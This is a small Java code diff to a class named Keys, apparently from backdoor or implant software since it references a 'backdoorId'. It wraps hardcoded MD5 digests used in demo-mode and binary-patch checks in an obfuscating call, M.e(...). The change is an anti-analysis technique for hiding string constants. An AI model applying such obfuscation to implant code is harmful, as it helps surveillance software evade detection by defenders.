@@ -166,7 +166,7 @@ public class Keys implements iKeys{
 
 	public boolean isDemo() {
 		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
-		byte[] demoDigest = ByteArray.hexStringToByteArray("863d9effe70187254d3c5e9c76613a99");
+		byte[] demoDigest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
 		byte[] calculated = Digest.MD5(demoMode);
 		
 		boolean ret = Arrays.equals(calculated, demoDigest);
@@ -212,7 +212,7 @@ public class Keys implements iKeys{
 	 */
 	public boolean hasBeenBinaryPatched() {
 		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
-		byte[] bDigest = ByteArray.hexStringToByteArray("b1688ffaaaafd7c1cab52e630b53178f");		
+		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));		
 		byte[] calculated = Digest.MD5(backdoorId);
 
 		if (Cfg.DEBUG) {
